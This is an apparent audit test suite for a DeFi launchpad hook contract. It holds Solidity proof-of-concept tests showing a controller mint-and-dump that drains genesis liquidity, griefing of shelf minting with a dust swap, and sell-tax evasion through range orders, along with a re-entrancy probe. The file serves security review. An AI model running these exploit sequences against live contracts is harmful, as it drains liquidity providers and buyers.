// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PoolKey} from "infinity-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "infinity-core/src/types/PoolId.sol";
import {ICLPoolManager} from "infinity-core/src/pool-cl/interfaces/ICLPoolManager.sol";
import {CLPoolManagerRouter} from "infinity-core/test/pool-cl/helpers/CLPoolManagerRouter.sol";
import {TickMath} from "infinity-core/src/pool-cl/libraries/TickMath.sol";
import {LiquidityAmounts} from "infinity-periphery/src/pool-cl/libraries/LiquidityAmounts.sol";

import {V2Base} from "./utils/V2Base.sol";
import {ToshLaunchpadHook} from "../../src/ToshLaunchpadHook.sol";
import {ToshToken} from "../../src/ToshToken.sol";
import {CircuitRevenueVault} from "../../src/CircuitRevenueVault.sol";

/// @notice Adversarial PoCs against ToshLaunchpadHook (v2).
/// @dev    `test_OPEN_*` pin behaviour that is known and not yet changed: they
///         pass while the issue stands, and are meant to fail, and be inverted,
///         by whatever change closes it.
contract HookAuditTest is V2Base {
    using PoolIdLibrary for PoolKey;

    ToshToken token;
    ToshLaunchpadHook hook;

    function setUp() public override {
        super.setUp();
        (token, hook) = _create();
        _buy(hook, alice, 5e18);
        _buy(hook, bob, 5e18);
    }

    function _launched() internal {
        _launchAsAdmin(hook);
        _nextBlock();
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = poolManager.getSlot0(hook.getPoolKey().toId());
    }

    // ─────────────────────────────────────────────────────────────────────────
    // M-1: the shelf beneficiary mints at ~1 % net cost and dumps on the pool.
    // ─────────────────────────────────────────────────────────────────────────

    function _mintAndDump(address who, bool rebate) internal returns (int256 pnl, uint256 minted) {
        uint256 q0 = quote.balanceOf(who);
        minted = hook.maxMintable();
        uint256 cost = hook.quoteMint(minted);
        vm.prank(who, who);
        hook.mintBondingCurve(minted, cost);
        if (rebate) {
            CircuitRevenueVault rv = CircuitRevenueVault(hook.projectAdmin());
            vm.prank(who);
            rv.withdraw(address(quote), who, type(uint256).max);
        }
        _swapSell(hook, who, minted);
        pnl = int256(quote.balanceOf(who)) - int256(q0);
    }

    function test_OPEN_H1_controllerMintAndDump_isProfitable() public {
        _launched();
        uint256 lpQuoteBefore = quote.balanceOf(address(vault));
        (int256 pnl, uint256 minted) = _mintAndDump(dev, true);
        console2.log("shelf tokens minted by controller", minted / 1e18);
        console2.log("controller net quote PnL (wei)", pnl);
        console2.log("quote drained from vault/pool (wei)", lpQuoteBefore - quote.balanceOf(address(vault)));
        assertGt(pnl, 0, "controller extracts quote from the pool by minting fresh supply");
    }

    /// @dev No outside buyers at all: the controller funds its own pump, waits
    ///      one TWAP window, mints the unlocked shelves, then dumps everything.
    function test_OPEN_H1_controllerSelfFundedCycles_drainGenesisLp() public {
        _launched();
        CircuitRevenueVault rv = CircuitRevenueVault(hook.projectAdmin());
        uint256 q0 = quote.balanceOf(dev);
        uint256 poolQ0 = quote.balanceOf(address(vault));
        uint256 supply0 = token.totalSupply();
        for (uint256 i; i < 4; ++i) {
            _swapBuy(hook, dev, 2e18);
            vm.warp(block.timestamp + hook.TWAP_WINDOW());
            _nextBlock();
            uint256 m = hook.maxMintable();
            if (m > 0) {
                uint256 cost = hook.quoteMint(m);
                vm.prank(dev, dev);
                hook.mintBondingCurve(m, cost);
                vm.prank(dev);
                rv.withdraw(address(quote), dev, type(uint256).max);
            }
            _swapSell(hook, dev, token.balanceOf(dev));
            _nextBlock();
        }
        int256 pnl = int256(quote.balanceOf(dev)) - int256(q0);
        console2.log("controller PnL after 4 self-funded cycles (wei)", pnl);
        console2.log("pool quote drained (wei)", poolQ0 - quote.balanceOf(address(vault)));
        console2.log("new supply minted (tokens)", (token.totalSupply() - supply0) / 1e18);
        assertGt(pnl, 0, "self-funded pump/mint/dump is profitable for the shelf beneficiary");
    }

    /// @dev Shelves are fixed-size in tokens while pool depth scales with the
    ///      raise, so a thin raise is drained almost entirely in one block.
    function test_OPEN_H1_thinRaise_controllerDrainsNearlyAllLpQuote() public {
        (ToshToken t2, ToshLaunchpadHook h2) = _create("Thin", HARD_CAP, AGENT_CAP);
        _buy(h2, carol, 0.5e18);
        _launchAsAdmin(h2);
        _nextBlock();
        hook = h2;
        token = t2;
        uint256 lpQuote = quote.balanceOf(address(vault)); // only the Thin pool is funded
        (int256 pnl, uint256 minted) = _mintAndDump(dev, true);
        uint256 left = quote.balanceOf(address(vault));
        console2.log("LP quote at open (wei)", lpQuote);
        console2.log("LP quote left after controller dump (wei)", left);
        console2.log("minted tokens", minted / 1e18);
        console2.log("controller PnL (wei)", pnl);
        assertGt(pnl, 0);
        assertLt(left * 5, lpQuote, "more than 80 % of the genesis LP quote extracted");
    }

    function test_H1_control_outsiderMintAndDump_loses() public {
        _launched();
        (int256 pnl,) = _mintAndDump(carol, false);
        console2.log("outsider net quote PnL (wei)", pnl);
        assertLt(pnl, 0);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // L-1: a tax-free 99-wei swap shuts shelf minting for the rest of the block.
    // ─────────────────────────────────────────────────────────────────────────

    function test_OPEN_L1_dustSwapGriefsShelfMint() public {
        _launched();
        assertGt(hook.maxMintable(), 0, "shelves open");
        uint256 cost = hook.quoteMint(1_000e18);

        uint256 res0 = quote.balanceOf(address(ladder));
        uint256 plat0 = quote.balanceOf(platform);
        _swapBuy(hook, trader, 99); // front-run by griefer
        assertEq(quote.balanceOf(address(ladder)), res0, "griefer paid no reservoir tax");
        assertEq(quote.balanceOf(platform), plat0, "griefer paid no platform tax");

        vm.prank(bob, bob);
        vm.expectRevert(ToshLaunchpadHook.SameBlockMintForbidden.selector);
        hook.mintBondingCurve(1_000e18, cost);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // L-2: range orders let a holder exit (or a buyer enter) with zero hook tax.
    // ─────────────────────────────────────────────────────────────────────────

    function test_OPEN_L2_rangeOrderSell_paysNoSellTax() public {
        _launched();
        PoolKey memory key = hook.getPoolKey();
        int24 t = _tick();
        int24 upper = (t / 200) * 200;
        if (t < 0 && t % 200 != 0) upper -= 200;
        if (upper == t) upper -= 200;
        int24 lower = upper - 2000;

        uint256 sellAmt = 50_000e18;
        uint128 liq = LiquidityAmounts.getLiquidityForAmount1(
            TickMath.getSqrtRatioAtTick(lower), TickMath.getSqrtRatioAtTick(upper), sellAmt
        );

        uint256 dead0 = token.balanceOf(DEAD);
        uint256 aliceTok0 = token.balanceOf(alice);
        uint256 aliceQ0 = quote.balanceOf(alice);

        vm.startPrank(alice);
        token.approve(address(router), type(uint256).max);
        router.modifyPosition(
            key,
            ICLPoolManager.ModifyLiquidityParams({
                tickLower: lower, tickUpper: upper, liquidityDelta: int256(uint256(liq)), salt: bytes32("alice-ro")
            }),
            ""
        );
        vm.stopPrank();

        // Organic buyers push the price through Alice's range.
        _swapBuy(hook, trader, 6e18);
        assertLt(_tick(), lower, "range fully crossed");
        uint256 deadAfterBuy = token.balanceOf(DEAD);

        vm.prank(alice);
        router.modifyPosition(
            key,
            ICLPoolManager.ModifyLiquidityParams({
                tickLower: lower, tickUpper: upper, liquidityDelta: -int256(uint256(liq)), salt: bytes32("alice-ro")
            }),
            ""
        );

        uint256 tokensSold = aliceTok0 - token.balanceOf(alice);
        uint256 quoteOut = quote.balanceOf(alice) - aliceQ0;
        console2.log("tokens exited via range order", tokensSold / 1e18);
        console2.log("quote received (wei)", quoteOut);
        console2.log("sell tax burned for alice (would be 1%)", token.balanceOf(DEAD) - deadAfterBuy);
        assertApproxEqRel(tokensSold, sellAmt, 1e15);
        assertGt(quoteOut, 0);
        assertEq(token.balanceOf(DEAD), dead0, "zero tokens burned: no 1% sell tax on this exit");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // L-3: exact-input tax is charged on amountSpecified, not on what filled.
    // ─────────────────────────────────────────────────────────────────────────

    function test_OPEN_L3_partialFillIsTaxedOnFullSpecifiedAmount() public {
        _launched();
        PoolKey memory key = hook.getPoolKey();
        (uint160 sp,,,) = poolManager.getSlot0(key.toId());
        uint160 limit = sp - sp / 10_000; // ~0.02 % price move allowed

        uint256 q0 = quote.balanceOf(trader);
        uint256 res0 = quote.balanceOf(address(ladder));
        uint256 plat0 = quote.balanceOf(platform);
        vm.prank(trader);
        router.swap(
            key,
            ICLPoolManager.SwapParams({zeroForOne: true, amountSpecified: -int256(10e18), sqrtPriceLimitX96: limit}),
            CLPoolManagerRouter.SwapTestSettings({withdrawTokens: true, settleUsingTransfer: true}),
            ""
        );
        uint256 paid = q0 - quote.balanceOf(trader);
        uint256 taxed = (quote.balanceOf(address(ladder)) - res0) + (quote.balanceOf(platform) - plat0);
        uint256 filled = paid - taxed;
        console2.log("quote paid", paid);
        console2.log("tax charged", taxed);
        console2.log("quote actually swapped", filled);
        assertEq(taxed, 0.1e18, "tax = 1% of the 10e18 specified");
        assertGt(taxed, filled, "effective tax rate > 100% of the filled input");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // L-4: the per-agent cap follows the handle, so a wallet whose name changes
    //      gets a fresh allowance.
    // ─────────────────────────────────────────────────────────────────────────

    function test_L4_newHandleOnSameWalletKeepsCap() public {
        // alice already spent AGENT_CAP in setUp
        vm.prank(alice, alice);
        vm.expectRevert(ToshLaunchpadHook.AgentCapReached.selector);
        hook.buyGenesis(1e18, 0);

        registry.setHandle(alice, "alice-second-name");
        vm.prank(alice, alice);
        vm.expectRevert(ToshLaunchpadHook.AgentCapReached.selector);
        hook.buyGenesis(1e18, 0);
        assertEq(hook.walletSpent(alice), AGENT_CAP);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Info: one pump + 30 idle minutes moves the reference all the way.
    // ─────────────────────────────────────────────────────────────────────────

    function test_OPEN_I1_singlePumpThenQuietWindow_opensFullLegRun() public {
        _launched();
        uint256 before = hook.maxMintable();
        _swapBuy(hook, trader, 3e18);
        vm.warp(block.timestamp + hook.TWAP_WINDOW());
        _nextBlock();
        (, uint256 spot, uint256 twap,,,) = _status(hook);
        console2.log("maxMintable before / after", before / 1e18, hook.maxMintable() / 1e18);
        assertApproxEqRel(twap, spot, 1e16, "TWAP == pumped spot after one idle window");
        assertEq(hook.maxMintable(), hook.MAX_TIERS_PER_TX() * hook.TIER_SIZE(), "full 32-shelf run open");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Info: controller pointing projectFund at the hook leaks the fund.
    // ─────────────────────────────────────────────────────────────────────────

    function test_I2_projectFundCannotBeTheHook() public {
        vm.prank(dev);
        vm.expectRevert(ToshLaunchpadHook.ZeroAddress.selector);
        hook.setProjectFund(address(hook));
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Sanity probes for areas judged sound.
    // ─────────────────────────────────────────────────────────────────────────

    function test_S1_launchMintsExactlyGenesisSupply_onSellOut() public {
        _sellOut(hook);
        _launchAsAdmin(hook);
        assertEq(token.totalSupply(), hook.GENESIS_SUPPLY());
        assertEq(quote.balanceOf(address(hook)), hook.fundAccrued(), "hook keeps only the fund");
    }

    function testFuzz_S2_genesisCapAndCostNeverExceeded(uint256 pay1, uint256 pay2) public {
        pay1 = bound(pay1, MIN_BUY, 10e18);
        pay2 = bound(pay2, 1, 10e18);
        address w = makeAddr("fuzzer");
        registry.setHandle(w, "fuzzer");
        quote.mint(w, 100e18);
        vm.startPrank(w, w);
        quote.approve(address(hook), type(uint256).max);
        (, uint256 c1) = hook.buyGenesis(pay1, 0);
        uint256 c2;
        try hook.buyGenesis(pay2, 0) returns (uint256, uint256 c) {
            c2 = c;
        } catch {}
        vm.stopPrank();
        assertLe(c1 + c2, AGENT_CAP);
        assertEq(hook.lpReserve() + hook.fundAccrued(), hook.raised());
    }

    function test_S3_nativeRefundReentryBlocked() public {
        // A 7702-style wallet re-entering on the change refund cannot double-buy.
        address w = makeAddr("reenter");
        Reenter code = new Reenter();
        vm.etch(w, address(code).code);
        registry.setHandle(w, "reenter");
        vm.deal(w, 10 ether);
        vm.prank(w, w);
        vm.expectRevert(ToshLaunchpadHook.NativeTransferFailed.selector);
        hook.buyGenesis{value: 6e18}(6e18, 0);
    }
}

contract Reenter {
    receive() external payable {
        ToshLaunchpadHook(payable(msg.sender)).buyGenesis{value: 0}(1e18, 0);
    }
}
